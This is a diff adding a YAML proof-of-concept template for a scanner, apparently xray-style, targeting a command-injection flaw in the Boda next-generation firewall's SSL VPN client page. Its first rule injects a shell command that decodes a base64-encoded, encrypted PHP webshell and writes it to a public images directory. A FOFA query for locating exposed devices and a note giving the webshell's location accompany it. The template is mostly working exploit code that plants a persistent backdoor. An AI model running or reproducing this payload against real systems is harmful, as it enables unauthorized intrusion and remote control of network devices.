@@ -1,0 +1,95 @@
+name: poc-yaml-boda-nextfirewall-upload
+detail:
+  author: 
+  links:
+    - 
+  vulnerability:
+    level: critical
+    fofa-query: app="博达通信-下一代防火墙"
+    hunter-query: 
+    quake-query: 
+    zoomeye-query: 
+    threatbook-query: 
+    cve: 
+    tips: 默认上传位置 /usr/local/webui/sslvpn/ | 马的位置 /usr/local/webui/sslvpn/public/images/
+
+transport: http
+set:
+    s1: randomInt(1000000000, 9000000000)
+    s2: randomLowercase(8)
+    s3: randomLowercase(8)
+    rboundary: randomInt(800000000, 1000000000)
+    reverse: newReverse()
+    reverseURL: reverse.url
+    t1: timeConvert(now(), '2006-01-02')
+    b1: base64Decode("")
+    h1: hexDecode("")
+
+rules:
+  r0:
+    request:
+      method: GET
+      path: /sslvpn/sslvpn_client.php?client=logoImg&img=;echo%20dGVzdHBhZ2U8P3BocApAc2Vzc2lvbl9zdGFydCgpOwpAc2V0X3RpbWVfbGltaXQoMCk7CkBlcnJvcl9yZXBvcnRpbmcoMCk7CgoKCmZ1bmN0aW9uIGFlczEyOCgkZGF0YSwkbW9kZSl7JHJlc3VsdD0iIjskYmxvY2tzaXplPTE2OyRrZXk9YmFzZTY0X2RlY29kZSgiMEo1WU0wZktnWVZybU1rd1RVSUYrUT09Iik7aWYoJG1vZGU9PTEpeyRwYWQ9JGJsb2Nrc2l6ZSAtKHN0cmxlbigkZGF0YSklICRibG9ja3NpemUpOyRkYXRhIC49c3RyX3JlcGVhdChjaHIoJHBhZCksICRwYWQpO31pZihmdW5jdGlvbl9leGlzdHMoIm9wZW5zc2xfZW5jcnlwdCIpKXtpZigkbW9kZT09MSl7JHJlc3VsdD1vcGVuc3NsX2VuY3J5cHQoJGRhdGEsIkFFUy0xMjgtRUNCIiwka2V5LE9QRU5TU0xfUkFXX0RBVEF8T1BFTlNTTF9aRVJPX1BBRERJTkcpO31lbHNleyRyZXN1bHQ9b3BlbnNzbF9kZWNyeXB0KCRkYXRhLCJBRVMtMTI4LUVDQiIsJGtleSxPUEVOU1NMX1JBV19EQVRBfE9QRU5TU0xfWkVST19QQURESU5HKTt9fWVsc2UgaWYoZnVuY3Rpb25fZXhpc3RzKCJtY3J5cHRfZW5jcnlwdCIpKXtpZigkbW9kZT09MSl7JHJlc3VsdD1tY3J5cHRfZW5jcnlwdCgicmlqbmRhZWwtMTI4IiwgJGtleSwgJGRhdGEsICJlY2IiLCAiIik7fWVsc2V7JHJlc3VsdD1tY3J5cHRfZGVjcnlwdCgicmlqbmRhZWwtMTI4IiwgJGtleSwgJGRhdGEsICJlY2IiLCAiIik7fX1pZigkbW9kZT09Mil7JHBhZD1vcmQoJHJlc3VsdHtzdHJsZW4oJHJlc3VsdCktMX0pO2lmKCRwYWQgPiBzdHJsZW4oJHJlc3VsdCkpcmV0dXJuIGZhbHNlO2lmKHN0cnNwbigkcmVzdWx0LCBjaHIoJHBhZCksIHN0cmxlbigkcmVzdWx0KS0gJHBhZCkhPSRwYWQpcmV0dXJuIGZhbHNlOyRyZXN1bHQ9c3Vic3RyKCRyZXN1bHQsIDAsIC0xICogJHBhZCk7fXJldHVybiAkcmVzdWx0O31mdW5jdGlvbiB4b3JFbmNyeXB0KCYkZGF0YSl7JGtleT1iYXNlNjRfZGVjb2RlKCJSODRzaCs2dUo5b1hKcE1mdzJwYy9RPT0iKTskbGVuPXN0cmxlbigkZGF0YSk7JGtleUxlbj1zdHJsZW4oJGtleSk7JGluZGV4PTA7Zm9yKCRpPTE7JGkgPD0kbGVuOyRpKyspeyRpbmRleD0kaS0xOyRkYXRhWyRpbmRleF09JGRhdGFbJGluZGV4XV4ka2V5WygkaSUka2V5TGVuKV07fX0KCgoKCgoKCiRyZXF1ZXN0RGF0YSA9IGZpbGVfZ2V0X2NvbnRlbnRzKCJwaHA6Ly9pbnB1dCIpOyRzdHJTaXplID0gc3RybGVuKCRyZXF1ZXN0RGF0YSk7JHJlcXVlc3REYXRhID0gc3Vic3RyKCRyZXF1ZXN0RGF0YSwxMTAsc3RybGVuKCRyZXF1ZXN0RGF0YSktMTEyKTsKJHJlcXVlc3REYXRhID0gcGFjaygiSCoiLCRyZXF1ZXN0RGF0YSk7JHJlcXVlc3REYXRhID0gYWVzMTI4KCRyZXF1ZXN0RGF0YSwgMik7CiRwYXlsb2FkTmFtZT0idUM0NTlZT20iOwppZiAoaXNzZXQoJF9TRVNTSU9OWyRwYXlsb2FkTmFtZV0pKXsKICAgICRwYXlsb2FkPWJhc2U2NF9kZWNvZGUoJF9TRVNTSU9OWyRwYXlsb2FkTmFtZV0pOwogICAgZXZhbCgkcGF5bG9hZCk7CiAgICAkcmVzcG9uc2VEYXRhID0gQHJ1bigkcmVxdWVzdERhdGEpOwogICAgeG9yRW5jcnlwdCgkcmVzcG9uc2VEYXRhKTskcmVzcG9uc2VEYXRhID0gYmFzZTY0X2VuY29kZSgkcmVzcG9uc2VEYXRhKTsKICAgICRyZXNwb25zZURhdGE9YmFzZTY0X2RlY29kZSgiZXlKamIyUmxJam93TENKa1lYUmhJanA3SW5OMVoyZGxjM1JKZEdWdGN5STZXMTBzSW1kc2IySmhiQ0k2SW1VeFNsUlJXREJ3V2c9PSIpLiRyZXNwb25zZURhdGE7JHJlc3BvbnNlRGF0YS49YmFzZTY0X2RlY29kZSgiSWl3aVpYaEVZWFJoSWpwN0ltRndhVjltYkc5M01ERWlPaUl3SWl3aVlYQnBYMlpzYjNjd01pSTZJakFpTENKaGNHbGZabXh2ZHpBeklqb2lNU0lzSW1Gd2FWOW1iRzkzTURRaU9pSXdJaXdpWVhCcFgyWnNiM2N3TlNJNklqQWlMQ0poY0dsZlpteHZkekEySWpvaU1DSXNJbUZ3YVY5bWJHOTNNRGNpT2lJd0lpd2lZWEJwWDNSaFp5STZJaklpTENKc2IyTmhiRjlqYVhSNWFXUWlPaUl0TVNKOWZYMD0iKTtAaHR0cF9yZXNwb25zZV9jb2RlKDIwMCk7aGVhZGVyKCJDb250ZW50LVR5cGU6IGFwcGxpY2F0aW9uL2pzb24iKTtlY2hvICRyZXNwb25zZURhdGE7Cn1lbHNlewogICAgJF9TRVNTSU9OWyRwYXlsb2FkTmFtZV0gPSBiYXNlNjRfZW5jb2RlKCRyZXF1ZXN0RGF0YSk7Cn0K%7Cbase64%20-d%7C%20tee%20.%2fpublic%2fimages%2fbottlle.php;
+      follow_redirects: false
+      headers:
+        User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36 Edg/122.0.0.0
+        Accept-Encoding: gzip, deflate, br
+        Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
+        Connection: close
+        Te: trailers
+        X-Forwarded-For: 127.0.0.1
+        X-Originating-Ip: 127.0.0.1
+        X-Remote-Addr: 127.0.0.1
+        X-Remote-Ip: 127.0.0.1
+      body:
+      
+    expression: response.status == 200  && response.body_string.contains("bottlle.php")
+
+    output:
+      search: |-
+        "(?P<rfile>\\w+.jsp)".bsubmatch(response.body)
+      rfile: search["rfile"]
+      search1: |-
+        "(?P<rdir>ico.*jsp)".bsubmatch(response.body)
+      rdir: search["rdir"]
+
+  r1:
+    request:
+      method: GET
+      path: /sslvpn/public/images/bottlle.php
+      follow_redirects: false
+      headers:
+      body:
+
+    expression: response.status == 200  && response.body_string.contains("testpage")
+
+  r2:
+    request:
+      method: GET
+      path: /sslvpn/sslvpn_client.php?client=logoImg&img=;echo%20dGVzdA==%7Cbase64%20-d%7C%20tee%204ndex.php;
+      follow_redirects: false
+      headers:
+        User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36 Edg/122.0.0.0
+        Accept-Encoding: gzip, deflate, br
+        Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
+        Connection: close
+        Te: trailers
+        X-Forwarded-For: 127.0.0.1
+        X-Originating-Ip: 127.0.0.1
+        X-Remote-Addr: 127.0.0.1
+        X-Remote-Ip: 127.0.0.1
+      body:
+
+    expression: response.status == 200  && response.body_string.contains("4ndex.php")
+
+  r3:
+    request:
+      method: GET
+      path: /sslvpn/4ndex.php
+      follow_redirects: false
+      headers:
+      body:
+
+    expression: response.status == 200  && response.body_string.contains("test")
+    
+expression: (r0() && r1() ||  r2() && r3())
